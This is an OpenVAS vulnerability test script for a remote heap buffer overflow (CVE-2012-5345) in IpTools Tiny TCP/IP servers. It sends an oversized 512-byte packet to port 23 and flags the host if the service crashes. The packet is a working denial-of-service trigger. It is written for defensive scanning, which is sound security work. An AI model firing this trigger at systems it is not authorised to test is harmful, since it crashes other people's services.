###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_iptools_remote_bof_vuln.nasl 11357 2018-09-12 10:57:05Z asteins $
#
# IpTools Tiny TCP/IP Servers Remote Buffer Overflow Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802290");
  script_version("$Revision: 11357 $");
  script_cve_id("CVE-2012-5345", "CVE-2012-5344");
  script_bugtraq_id(51311, 51312);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-09-12 12:57:05 +0200 (Wed, 12 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-01-09 17:17:17 +0530 (Mon, 09 Jan 2012)");
  script_name("IpTools Tiny TCP/IP Servers Remote Buffer Overflow Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl");
  script_require_ports(23);

  script_xref(name:"URL", value:"http://sourceforge.net/projects/iptools/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/521142");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/108430/iptools-overflow.txt");

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to execute
  arbitrary code within the context of the application or cause a denial of service condition.");

  script_tag(name:"affected", value:"IpTools Tiny TCP/IP servers 0.1.4");

  script_tag(name:"insight", value:"The flaw is due to a boundary error when processing large size
  packets. This can be exploited to cause a heap-based buffer overflow via
  a specially crafted packet sent to port 23.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running IpTools and prone to buffer overflow
  vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

port = 23; # Default Port
if(!get_port_state(port)){
  exit(0);
}

if(!soc = open_sock_tcp(port)){
  exit(0);
}

res = recv(socket:soc, length:512);
if("Tiny command server" >!< res){
  close(soc);
  exit(0);
}

send(socket:soc, data:crap(data:"a", length:512));
close(soc);

sleep(3);

if(!soc1 = open_sock_tcp(port)){
  security_message(port:port);
  exit(0);
}

if(! res = recv(socket:soc1, length:512)) {
  security_message(port:port);
}

close(soc1);
